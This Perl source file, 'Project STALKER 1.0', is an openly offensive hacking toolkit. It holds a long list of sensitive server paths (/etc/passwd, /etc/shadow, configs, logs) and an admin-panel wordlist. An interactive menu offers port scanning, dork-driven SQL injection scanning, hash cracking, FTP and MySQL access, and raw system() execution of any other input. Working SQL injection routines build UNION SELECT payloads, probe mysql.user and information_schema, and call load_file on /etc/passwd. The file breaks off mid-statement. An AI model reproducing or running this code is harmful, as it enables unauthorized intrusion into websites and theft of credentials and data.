#!usr/bin/perl
#Project STALKER 1.0
#(C) Doddy Hackman 2012
#
#ppm install http://www.bribes.org/perl/ppm/DBI.ppd
#ppm install http://theoryx5.uwinnipeg.ca/ppms/DBD-mysql.ppd
#http://search.cpan.org/~animator/Color-Output-1.05/Output.pm

use IO::Socket;
use HTML::LinkExtor;
use LWP::UserAgent;
use Win32;                ## Comment this line for Linux
use Win32::OLE qw(in);    ## Comment this line for Linux
use Win32::Process;       ## Comment this line for Linux
use Net::FTP;
use Cwd;
use URI::Split qw(uri_split);
use MIME::Base64;
use DBI;                  ## Comment this line for Linux
use URI::Escape;

use Color::Output;
Color::Output::Init

  my @files = (
    'C:/xampp/htdocs/aca.txt',
    'C:/xampp/htdocs/aca.txt',
    'C:/xampp/htdocs/admin.php',
    'C:/xampp/htdocs/leer.txt',
    '../../../boot.ini',
    '../../../../boot.ini',
    '../../../../../boot.ini',
    '../../../../../../boot.ini',
    '/etc/passwd',
    '/etc/shadow',
    '/etc/shadow~',
    '/etc/hosts',
    '/etc/motd',
    '/etc/apache/apache.conf',
    '/etc/fstab',
    '/etc/apache2/apache2.conf',
    '/etc/apache/httpd.conf',
    '/etc/httpd/conf/httpd.conf',
    '/etc/apache2/httpd.conf',
    '/etc/apache2/sites-available/default',
    '/etc/mysql/my.cnf',
    '/etc/my.cnf',
    '/etc/sysconfig/network-scripts/ifcfg-eth0',
    '/etc/redhat-release',
    '/etc/httpd/conf.d/php.conf',
    '/etc/pam.d/proftpd',
    '/etc/phpmyadmin/config.inc.php',
    '/var/www/config.php',
    '/etc/httpd/logs/error_log',
    '/etc/httpd/logs/error.log',
    '/etc/httpd/logs/access_log',
    '/etc/httpd/logs/access.log',
    '/var/log/apache/error_log',
    '/var/log/apache/error.log',
    '/var/log/apache/access_log',
    '/var/log/apache/access.log',
    '/var/log/apache2/error_log',
    '/var/log/apache2/error.log',
    '/var/log/apache2/access_log',
    '/var/log/apache2/access.log',
    '/var/www/logs/error_log',
    '/var/www/logs/error.log',
    '/var/www/logs/access_log',
    '/var/www/logs/access.log',
    '/usr/local/apache/logs/error_log',
    '/usr/local/apache/logs/error.log',
    '/usr/local/apache/logs/access_log',
    '/usr/local/apache/logs/access.log',
    '/var/log/error_log',
    '/var/log/error.log',
    '/var/log/access_log',
    '/var/log/access.log',
    '/etc/group',
    '/etc/security/group',
    '/etc/security/passwd',
    '/etc/security/user',
    '/etc/security/environ',
    '/etc/security/limits',
    '/usr/lib/security/mkuser.default',
    '/apache/logs/access.log',
    '/apache/logs/error.log',
    '/etc/httpd/logs/acces_log',
    '/etc/httpd/logs/acces.log',
    '/var/log/httpd/access_log',
    '/var/log/httpd/error_log',
    '/apache2/logs/error.log',
    '/apache2/logs/access.log',
    '/logs/error.log',
    '/logs/access.log',
    '/usr/local/apache2/logs/access_log',
    '/usr/local/apache2/logs/access.log',
    '/usr/local/apache2/logs/error_log',
    '/usr/local/apache2/logs/error.log',
    '/var/log/httpd/access.log',
    '/var/log/httpd/error.log',
    '/opt/lampp/logs/access_log',
    '/opt/lampp/logs/error_log',
    '/opt/xampp/logs/access_log',
    '/opt/xampp/logs/error_log',
    '/opt/lampp/logs/access.log',
    '/opt/lampp/logs/error.log',
    '/opt/xampp/logs/access.log',
    '/opt/xampp/logs/error.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\access.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\error.log',
    '/usr/local/apache/conf/httpd.conf',
    '/usr/local/apache2/conf/httpd.conf',
    '/etc/apache/conf/httpd.conf',
    '/usr/local/etc/apache/conf/httpd.conf',
    '/usr/local/apache/httpd.conf',
    '/usr/local/apache2/httpd.conf',
    '/usr/local/httpd/conf/httpd.conf',
    '/usr/local/etc/apache2/conf/httpd.conf',
    '/usr/local/etc/httpd/conf/httpd.conf',
    '/usr/apache2/conf/httpd.conf',
    '/usr/apache/conf/httpd.conf',
    '/usr/local/apps/apache2/conf/httpd.conf',
    '/usr/local/apps/apache/conf/httpd.conf',
    '/etc/apache2/conf/httpd.conf',
    '/etc/http/conf/httpd.conf',
    '/etc/httpd/httpd.conf',
    '/etc/http/httpd.conf',
    '/etc/httpd.conf',
    '/opt/apache/conf/httpd.conf',
    '/opt/apache2/conf/httpd.conf',
    '/var/www/conf/httpd.conf',
    '/private/etc/httpd/httpd.conf',
    '/private/etc/httpd/httpd.conf.default',
    '/Volumes/webBackup/opt/apache2/conf/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
    'C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf',
    'C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf',
    'C:\ProgramFiles\xampp\apache\conf\httpd.conf',
    '/usr/local/php/httpd.conf.php',
    '/usr/local/php4/httpd.conf.php',
    '/usr/local/php5/httpd.conf.php',
    '/usr/local/php/httpd.conf',
    '/usr/local/php4/httpd.conf',
    '/usr/local/php5/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php',
    '/usr/local/etc/apache/vhosts.conf',
    '/etc/php.ini',
    '/bin/php.ini',
    '/etc/httpd/php.ini',
    '/usr/lib/php.ini',
    '/usr/lib/php/php.ini',
    '/usr/local/etc/php.ini',
    '/usr/local/lib/php.ini',
    '/usr/local/php/lib/php.ini',
    '/usr/local/php4/lib/php.ini',
    '/usr/local/php5/lib/php.ini',
    '/usr/local/apache/conf/php.ini',
    '/etc/php4.4/fcgi/php.ini',
    '/etc/php4/apache/php.ini',
    '/etc/php4/apache2/php.ini',
    '/etc/php5/apache/php.ini',
    '/etc/php5/apache2/php.ini',
    '/etc/php/php.ini',
    '/etc/php/php4/php.ini',
    '/etc/php/apache/php.ini',
    '/etc/php/apache2/php.ini',
    '/web/conf/php.ini',
    '/usr/local/Zend/etc/php.ini',
    '/opt/xampp/etc/php.ini',
    '/var/local/www/conf/php.ini',
    '/etc/php/cgi/php.ini',
    '/etc/php4/cgi/php.ini',
    '/etc/php5/cgi/php.ini',
    'c:\php5\php.ini',
    'c:\php4\php.ini',
    'c:\php\php.ini',
    'c:\PHP\php.ini',
    'c:\WINDOWS\php.ini',
    'c:\WINNT\php.ini',
    'c:\apache\php\php.ini',
    'c:\xampp\apache\bin\php.ini',
    'c:\NetServer\bin\stable\apache\php.ini',
    'c:\home2\bin\stable\apache\php.ini',
    'c:\home\bin\stable\apache\php.ini',
    '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
    '/usr/local/cpanel/logs',
    '/usr/local/cpanel/logs/stats_log',
    '/usr/local/cpanel/logs/access_log',
    '/usr/local/cpanel/logs/error_log',
    '/usr/local/cpanel/logs/license_log',
    '/usr/local/cpanel/logs/login_log',
    '/var/cpanel/cpanel.config',
    '/var/log/mysql/mysql-bin.log',
    '/var/log/mysql.log',
    '/var/log/mysqlderror.log',
    '/var/log/mysql/mysql.log',
    '/var/log/mysql/mysql-slow.log',
    '/var/mysql.log',
    '/var/lib/mysql/my.cnf',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\data\hostname.err',
    'C:\ProgramFiles\MySQL\data\mysql.log',
    'C:\ProgramFiles\MySQL\data\mysql.err',
    'C:\ProgramFiles\MySQL\data\mysql-bin.log',
    'C:\MySQL\data\hostname.err',
    'C:\MySQL\data\mysql.log',
    'C:\MySQL\data\mysql.err',
    'C:\MySQL\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf',
    'C:\ProgramFiles\MySQL\my.ini',
    'C:\ProgramFiles\MySQL\my.cnf',
    'C:\MySQL\my.ini',
    'C:\MySQL\my.cnf',
    '/etc/logrotate.d/proftpd',
    '/www/logs/proftpd.system.log',
    '/var/log/proftpd',
    '/etc/proftp.conf',
    '/etc/protpd/proftpd.conf',
    '/etc/vhcs2/proftpd/proftpd.conf',
    '/etc/proftpd/modules.conf',
    '/var/log/vsftpd.log',
    '/etc/vsftpd.chroot_list',
    '/etc/logrotate.d/vsftpd.log',
    '/etc/vsftpd/vsftpd.conf',
    '/etc/vsftpd.conf',
    '/etc/chrootUsers',
    '/var/log/xferlog',
    '/var/adm/log/xferlog',
    '/etc/wu-ftpd/ftpaccess',
    '/etc/wu-ftpd/ftphosts',
    '/etc/wu-ftpd/ftpusers',
    '/usr/sbin/pure-config.pl',
    '/usr/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.conf',
    '/usr/local/etc/pure-ftpd.conf',
    '/usr/local/etc/pureftpd.pdb',
    '/usr/local/pureftpd/etc/pureftpd.pdb',
    '/usr/local/pureftpd/sbin/pure-config.pl',
    '/usr/local/pureftpd/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.pdb',
    '/etc/pureftpd.pdb',
    '/etc/pureftpd.passwd',
    '/etc/pure-ftpd/pureftpd.pdb',
    '/var/log/pure-ftpd/pure-ftpd.log',
    '/logs/pure-ftpd.log',
    '/var/log/pureftpd.log',
    '/var/log/ftp-proxy/ftp-proxy.log',
    '/var/log/ftp-proxy',
    '/var/log/ftplog',
    '/etc/logrotate.d/ftp',
    '/etc/ftpchroot',
    '/etc/ftphosts',
    '/var/log/exim_mainlog',
    '/var/log/exim/mainlog',
    '/var/log/maillog',
    '/var/log/exim_paniclog',
    '/var/log/exim/paniclog',
    '/var/log/exim/rejectlog',
    '/var/log/exim_rejectlog'
  );

@panels = (
    'admin/admin.asp', 'admin/login.asp', 'admin/index.asp', 'admin/admin.aspx'
    , 'admin/login.aspx', 'admin/index.aspx', 'admin/webmaster.asp',
    'admin/webmaster.aspx'
    , 'asp/admin/index.asp', 'asp/admin/index.aspx', 'asp/admin/admin.asp',
    'asp/admin/admin.aspx'
    , 'asp/admin/webmaster.asp', 'asp/admin/webmaster.aspx', 'admin/',
    'login.asp', 'login.aspx'
    , 'admin.asp', 'admin.aspx', 'webmaster.aspx', 'webmaster.asp',
    'login/index.asp', 'login/index.aspx'
    , 'login/login.asp', 'login/login.aspx', 'login/admin.asp',
    'login/admin.aspx'
    , 'administracion/index.asp', 'administracion/index.aspx',
    'administracion/login.asp'
    , 'administracion/login.aspx', 'administracion/webmaster.asp',
    'administracion/webmaster.aspx'
    , 'administracion/admin.asp', 'administracion/admin.aspx', 'php/admin/',
    'admin/admin.php'
    , 'admin/index.php', 'admin/login.php', 'admin/system.php',
    'admin/ingresar.php'
    , 'admin/administrador.php', 'admin/default.php', 'administracion/',
    'administracion/index.php'
    , 'administracion/login.php', 'administracion/ingresar.php',
    'administracion/admin.php'
    , 'administration/', 'administration/index.php', 'administration/login.php'
    , 'administrator/index.php', 'administrator/login.php',
    'administrator/system.php', 'system/'
    , 'system/login.php', 'admin.php', 'login.php', 'administrador.php',
    'administration.php'
    , 'administrator.php', 'admin1.html', 'admin1.php', 'admin2.php',
    'admin2.html', 'yonetim.php'
    , 'yonetim.html', 'yonetici.php', 'yonetici.html', 'adm/',
    'admin/account.php', 'admin/account.html'
    , 'admin/index.html', 'admin/login.html', 'admin/home.php',
    'admin/controlpanel.html'
    , 'admin/controlpanel.php', 'admin.html', 'admin/cp.php', 'admin/cp.html',
    'cp.php', 'cp.html'
    , 'administrator/', 'administrator/index.html', 'administrator/login.html'
    , 'administrator/account.html', 'administrator/account.php',
    'administrator.html', 'login.html'
    , 'modelsearch/login.php', 'moderator.php', 'moderator.html',
    'moderator/login.php'
    , 'moderator/login.html', 'moderator/admin.php', 'moderator/admin.html',
    'moderator/'
    , 'account.php', 'account.html', 'controlpanel/', 'controlpanel.php',
    'controlpanel.html'
    , 'admincontrol.php', 'admincontrol.html', 'adminpanel.php',
    'adminpanel.html', 'admin1.asp'
    , 'admin2.asp', 'yonetim.asp', 'yonetici.asp', 'admin/account.asp',
    'admin/home.asp'
    , 'admin/controlpanel.asp', 'admin/cp.asp', 'cp.asp',
    'administrator/index.asp'
    , 'administrator/login.asp', 'administrator/account.asp',
    'administrator.asp'
    , 'modelsearch/login.asp', 'moderator.asp', 'moderator/login.asp',
    'moderator/admin.asp'
    , 'account.asp', 'controlpanel.asp', 'admincontrol.asp', 'adminpanel.asp',
    'fileadmin/'
    , 'fileadmin.php', 'fileadmin.asp', 'fileadmin.html', 'administration.html',
    'sysadmin.php'
    , 'sysadmin.html', 'phpmyadmin/', 'myadmin/', 'sysadmin.asp', 'sysadmin/',
    'ur-admin.asp'
    , 'ur-admin.php', 'ur-admin.html', 'ur-admin/', 'Server.php', 'Server.html'
    , 'Server.asp', 'Server/', 'wp-admin/', 'administr8.php', 'administr8.html'
    , 'administr8/', 'administr8.asp', 'webadmin/', 'webadmin.php',
    'webadmin.asp'
    , 'webadmin.html', 'administratie/', 'admins/', 'admins.php', 'admins.asp'
    , 'admins.html', 'administrivia/', 'Database_Administration/', 'WebAdmin/'
    , 'useradmin/', 'sysadmins/', 'admin1/', 'system-administration/',
    'administrators/'
    , 'pgadmin/', 'directadmin/', 'staradmin/', 'ServerAdministrator/',
    'SysAdmin/'
    , 'administer/', 'LiveUser_Admin/', 'sys-admin/', 'typo3/', 'panel/',
    'cpanel/'
    , 'cPanel/', 'cpanel_file/', 'platz_login/', 'rcLogin/', 'blogindex/',
    'formslogin/
', 'autologin/', 'support_login/', 'meta_login/', 'manuallogin/', 'simpleLogin/
', 'loginflat/', 'utility_login/', 'showlogin/',  'memlogin/',    'members/',
    'login-redirect/
', 'sub-login/', 'wp-login/', 'login1/', 'dir-login/', 'login_db/', 'xlogin/',
    'smblogin/
', 'customer_login/', 'UserLogin/', 'login-us/', 'acct_login/', 'admin_area/',
    'bigadmin/'
    , 'project-admins/', 'phppgadmin/', 'pureadmin/', 'sql-admin/', 'radmind/',
    'openvpnadmin/'
    , 'wizmysqladmin/', 'vadmind/', 'ezsqliteadmin/', 'hpwebjetadmin/',
    'newsadmin/', 'adminpro/'
    , 'Lotus_Domino_Admin/', 'bbadmin/', 'vmailadmin/', 'Indy_admin/',
    'ccp14admin/'
    , 'irc-macadmin/', 'banneradmin/', 'sshadmin/', 'phpldapadmin/', 'macadmin/'
    , 'administratoraccounts/', 'admin4_account/', 'admin4_colon/', 'radmind-1/'
    , 'Super-Admin/', 'AdminTools/', 'cmsadmin/', 'SysAdmin2/', 'globes_admin/'
    , 'cadmins/', 'phpSQLiteAdmin/', 'navSiteAdmin/', 'server_admin_small/',
    'logo_sysadmin/'
    , 'server/', 'database_administration/', 'power_user/',
    'system_administration/'
    , 'ss_vms_admin_sm/'
);

unless ( -d "/logs/webs" ) {
    mkdir( "logs/",      777 );
    mkdir( "logs/webs/", 777 );
}

my $nave = LWP::UserAgent->new;
$nave->agent(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12"
);
$nave->timeout(5);

head();

getinfo();    ## Comment this line for Linux

$SIG{INT} = \&next;    ## Comment on this line to compile to exe

while (1) {

    menujo();

}

sub getinfo {

    $so     = Win32::GetOSName();
    $login  = Win32::LoginName();
    $domain = Win32::DomainName();
    cprint "\x0313";    #13
    print "\n\n[OS] : $so [Login] : $login [Group] : $domain\n\n";
    cprint "\x030";
}

sub menujo {

    print "\n\n";
    cprint "\x035r00t\x030";     #13
    cprint "\x033 ~ # \x030";    #13

    cprint "\x037";

    chomp( my $cmd = <stdin> );
    print "\n\n";

###############################################################################

    if ( $cmd eq "cmd_getinfo" ) {
        getinfo();
    }
    elsif ( $cmd =~ /cmd_getip(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_getip <host>\n";
        }
        else {
            print "\n[IP] : " . getip($te) . "\n";
            print "\n";
        }
    }

    elsif ( $cmd =~ /cmd_whois(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_whois <host>\n";
        }
        else {
            print "[+] Getting data\n\n";
            print whois($te);
            print "\n\n";
        }
    }

    elsif ( $cmd =~ /cmd_locate(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_locate <host>\n";
        }
        else {
            infocon($te);
            print "\n\n";
        }
    }

    elsif ( $cmd =~ /cmd_getlinks(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_getlinks <page>\n";
        }
        else {
            print "[+] Extracting links in the page\n\n\n";
            $code = toma($te);
            my @re = get_links($code);
            for my $url (@re) {
                print "[Link] : $url\n";
            }
            print "\n\n[+] Finish\n";
        }
    }

    elsif ( $cmd eq "cmd_help" ) {
        helpme();
    }

    elsif ( $cmd eq "cmd_getprocess" ) {
        my %re = getprocess();

        for my $data ( keys %re ) {
            ( $proceso, $pid ) = ( $t =~ /(.*):(.*)/ig );
            print "[+] Proceso : " . $data . "\n";
            print "[+] PID : " . $re{$data} . "\n\n";
        }
    }
    elsif ( $cmd =~ /cmd_killprocess(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_killprocess <pid>\n";
        }
        else {
            if ( killprocess($te) ) {
                print "[+] Process closed\n";
            }
        }

    }
    elsif ( $cmd =~ /cmd_conec(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_conec <host> <port> <command>\n";
        }
        else {
            if ( $cmd =~ /cmd_conec (.*) (.*) (.*)/ ) {
                my ( $a, $b, $c ) = ( $1, $2, $3 );
                print conectar( $a, $b, $c );
            }
        }
    }

    elsif ( $cmd =~ /cmd_allow(.*)/ ) {

        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_allow <host>\n";
        }
        else {
            $re = conectar( $te, "80", "GET / HTTP/1.0\r\n" );
            if ( $re =~ /Allow:(.*)/ig ) {
                print "[+] Allow : " . $1 . "\n";
            }
            else {
                print "\n[-] Not Found\n";
            }
        }
    }

    elsif ( $cmd =~ /cmd_paths(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_paths <page>\n";
        }
        else {
            scanpaths($te);
        }
    }

    elsif ( $cmd =~ /cmd_encodehex(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_encodehex <text>\n";
        }
        else {
            print "\n\n[+] " . hex_en($te) . "\n\n";
        }
    }

    elsif ( $cmd =~ /cmd_decodehex(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_decodehex <text>\n";
        }
        else {
            print "\n\n[+] " . hex_de($te) . "\n\n";
        }
    }

    elsif ( $cmd =~ /cmd_download(.*)/ ) {

        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_download <url>\n";
        }
        else {

            my $file = $te;
            my ( $scheme, $auth, $path, $query, $frag ) = uri_split($te);

            if ( $path =~ /(.*)\/(.*)$/ ) {
                my $file = $2;

                print "[+] Downloading ...\n";

                if ( download( $te, $file ) ) {
                    print "[+] File downloaded\n";
                }
            }
        }

    }

    elsif ( $cmd =~ /cmd_encodeascii(.*)/ ) {

        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_encodeascii <text>\n";
        }
        else {
            print "\n\n[+] " . ascii($te) . "\n\n";
        }

    }

    elsif ( $cmd =~ /cmd_decodeascii(.*)/ ) {

        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_decodeascii <text>\n";
        }
        else {
            print "\n\n[+] " . ascii_de($te) . "\n\n";
        }

    }

    elsif ( $cmd =~ /cmd_encodebase(.*)/ ) {

        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_encodebase <text>\n";
        }
        else {
            print "\n\n[+] " . base($te) . "\n\n";
        }

    }

    elsif ( $cmd =~ /cmd_decodebase(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_decodebase <text>\n";
        }
        else {
            print "\n\n[+] " . base_de($te) . "\n\n";
        }
    }

    elsif ( $cmd eq "cmd_aboutme" ) {
        aboutme();
    }

    elsif ( $cmd =~ /cmd_scanport(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_scanport <host>\n";
        }
        else {
            scanport($te);
        }
    }

    elsif ( $cmd =~ /cmd_panel(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_panel <web>\n";
        }
        else {
            scanpanel($te);
        }

    }

    elsif ( $cmd =~ /cmd_scangoogle/ ) {
        print "[Dork] : ";
        chomp( my $dork = <stdin> );
        print "\n\n[Pages] : ";
        chomp( my $pages = <stdin> );
        print "\n\n[Starting the search]\n\n";
        my @links = google( $dork, $pages );
        print "\n[Links Found] : " . int(@links) . "\n\n\n";
        print "[Starting the scan]\n\n\n";

        for my $link (@links) {
            if ( $link =~ /(.*)=/ig ) {
                my $web = $1;
                sql( $web . "=" );
            }
        }
        print "\n\n[+] Finish\n";
    }

    elsif ( $cmd =~ /cmd_getpass(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_getpass <hash>\n";
        }
        else {
            my $ha = $te;
            if ( ver_length($ha) ) {
                print "[+] Cracking Hash...\n";
                my $re = crackit($ha);
                unless ( $re =~ /false01/ ) {
                    print "\n\n[+] Cracked : $re\n\n";
                    saveyes( "logs/hashes-found.txt", $ha . ":" . $re );
                }
                else {
                    print "\n[-] Not Found\n\n";
                }
            }
            else {
                print "\n\n[-] Hash invalid\n\n";
            }
        }

    }

    elsif ( $cmd =~ /cmd_ftp(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_ftp <host> <user> <pass>\n";
        }
        else {
            if ( $cmd =~ /cmd_ftp (.*) (.*) (.*)/ ) {
                ftp( $1, $2, $3 );
            }
        }
    }

    elsif ( $cmd eq "cmd_navegator" ) {
      nave:
        print getcwd() . ">";
        chomp( my $rta = <stdin> );
        print "\n\n";
        if ( $rta =~ /list/ ) {
            my @files = coleccionar( getcwd() );
            for (@files) {
                if ( -f $_ ) {
                    print "[File] : " . $_ . "\n";
                }
                else {
                    print "[Directory] : " . $_ . "\n";
                }
            }
        }
        if ( $rta =~ /cd (.*)/ ) {
            my $dir = $1;
            if ( chdir($dir) ) {
                print "\n[+] Directory changed\n";
            }
            else {
                print "\n[-] Error\n";
            }
        }
        if ( $rta =~ /del (.*)/ ) {
            my $file = getcwd() . "/" . $1;
            if ( -f $file ) {
                if ( unlink($file) ) {
                    print "\n[+] File Deleted\n";
                }
                else {
                    print "\n[-] Error\n";
                }
            }
            else {
                if ( rmdir($file) ) {
                    print "\n[+] Directory Deleted\n";
                }
                else {
                    print "\n[-] Error\n";
                }
            }
        }
        if ( $rta =~ /rename (.*) (.*)/ ) {
            if ( rename( getcwd() . "/" . $1, getcwd() . "/" . $2 ) ) {
                print "\n[+] File Changed\n";
            }
            else {
                print "\n[-] Error\n";
            }
        }
        if ( $rta =~ /open (.*)/ ) {
            my $file = $1;
            chomp $file;
            system($file);

            #system(getcwd()."/".$file);
        }

        if ( $rta eq "help" ) {
            print "\nCommands :

help
cd <dir>
list 
del <del>
rename <file1> <file2> 
open <file>
exit
\n\n";
        }

        if ( $rta eq "exit" ) {
            next;
        }

        print "\n\n";
        goto nave;
    }
    elsif ( $cmd =~ /cmd_kobra(.*)/ ) {
        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_kobra <page>\n";
        }
        else {
            my $url = $te;
            chomp $url;
            scansqli( $url, "--" );
        }
    }

    elsif ( $cmd =~ /cmd_mysql(.*)/ ) {

        my $te = $1;
        $te =~ s/ //;
        if ( $te eq "" or $te eq " " ) {
            print "\n[+] sintax : cmd_mysql <host> <user> <pass>\n";
        }
        else {
            if ( $cmd =~ /cmd_mysql (.*) (.*) (.*)/ ) {
                enter( $1, $2, $3 );
            }
        }

    }

    elsif ( $cmd eq "cmd_exit" ) {
        copyright();
        <stdin>;
        exit(1);
    }

    else {
        system($cmd);
    }
    cprint "\x030";
#####################################################################################
}

sub scansqli {

    my $page = $_[0];
    print "[Status] : Scanning.....\n";
    ( $pass1, $bypass2 ) = &bypass( $_[1] );
    my $save = partimealmedio( $_[0] );
    if ( $_[0] =~ /hackman/ig ) {
        savefile( $save . ".txt", "\n[Target Confirmed] : $_[0]\n" );
        &menu_options( $_[0], $pass, $save );
    }
    else {

        my $testar1 = toma( $page . $pass1 . "and" . $pass1 . "1=0" . $pass2 );
        my $testar2 = toma( $page . $pass1 . "and" . $pass1 . "1=1" . $pass2 );

        unless ( $testar1 eq $testar2 ) {
            motor( $page, $_[1] );
        }
        else {
            print "\n[-] Not vulnerable\n\n";
            print "[+] Scan anyway y/n : ";
            chomp( my $op = <stdin> );
            if ( $op eq "y" ) {
                motor( $page, $_[1] );
            }
            else {

                #head();
                #menu();
            }
        }
    }
}

sub motor {

    my ( $gen, $save, $control ) = &length( $_[0], $_[1] );

    if ( $control eq 1 ) {
        print "[Status] : Enjoy the menu\n\n";
        &menu_options( $gen, $pass, $save );
    }
    else {
        print "[Status] : Length columns not found\n\n";
    }
}

sub length {
    print "\n[+] Looking for the number of columns\n\n";
    my $rows = "0";
    my $asc;
    my $page = $_[0];
    ( $pass1, $pass2 ) = &bypass( $_[1] );

    $alert = "char(" . ascii("RATSXPDOWN1RATSXPDOWN") . ")";
    $total = "1";
    for my $rows ( 2 .. 200 ) {
        $asc .=
          "," . "char(" . ascii( "RATSXPDOWN" . $rows . "RATSXPDOWN" ) . ")";
        $total .= "," . $rows;
        $injection =
            $page . "1" 
          . $pass1 . "and" 
          . $pass1 . "1=0" 
          . $pass1 . "union"
          . $pass1
          . "select"
          . $pass1
          . $alert
          . $asc;
        $test = toma($injection);
        if ( $test =~ /RATSXPDOWN/ ) {
            @number = $test =~ m{RATSXPDOWN(\d+)RATSXPDOWN}g;
            $control = 1;
            my $save = partimealmedio( $_[0] );
            savefile( $save . ".txt", "\n[Target confirmed] : $page" );
            savefile( $save . ".txt", "[Bypass] : $_[1]\n" );
            savefile( $save . ".txt", "[Limit] : The site has $rows columns" );
            savefile( $save . ".txt",
                "[Data] : The number @number print data" );
            $total =~ s/$number[0]/hackman/;
            savefile(
                $save . ".txt",
                "[SQLI] : " 
                  . $page . "1" 
                  . $pass1 . "and" 
                  . $pass1 . "1=0"
                  . $pass1 . "union"
                  . $pass1
                  . "select"
                  . $pass1
                  . $total
            );
            return (
                $page . "1" 
                  . $pass1 . "and" 
                  . $pass1 . "1=0" 
                  . $pass1 . "union"
                  . $pass1
                  . "select"
                  . $pass1
                  . $total,
                $save, $control
            );
        }
    }
}

sub details {
    my ( $page, $bypass, $save ) = @_;
    ( $pass1, $pass2 ) = &bypass($bypass);
    savefile( $save . ".txt", "\n" );
    if ( $page =~ /(.*)hackman(.*)/ig ) {
        print "\n[+] Searching information..\n\n";
        my ( $start, $end ) = ( $1, $2 );
        $inforschema =
            $start
          . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
          . $end
          . $pass1 . "from"
          . $pass1
          . "information_schema.tables"
          . $pass2;
        $mysqluser =
            $start
          . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
          . $end
          . $pass1 . "from"
          . $pass1
          . "mysql.user"
          . $pass2;
        $test3 =
          toma( $start
              . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
              . $end
              . $pass2 );
        $test1 = toma($inforschema);
        $test2 = toma($mysqluser);
        if ( $test2 =~ /ERTOR854/ig ) {
            savefile( $save . ".txt", "[mysql.user] : ON" );
            print "[mysql.user] : ON\n";
        }
        else {
            print "[mysql.user] : OFF\n";
            savefile( $save . ".txt", "[mysql.user] : OFF" );
        }
        if ( $test1 =~ /ERTOR854/ig ) {
            print "[information_schema.tables] : ON\n";
            savefile( $save . ".txt", "[information_schema.tables] : ON" );
        }
        else {
            print "[information_schema.tables] : OFF\n";
            savefile( $save . ".txt", "[information_schema.tables] : OFF" );
        }
        if ( $test3 =~ /ERTOR854/ig ) {
            print "[load_file] : ON\n";
            savefile(
                $save . ".txt",
                "[load_file] : " 
                  . $start
                  . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                  . $end
                  . $pass2
            );
        }
        $concat =
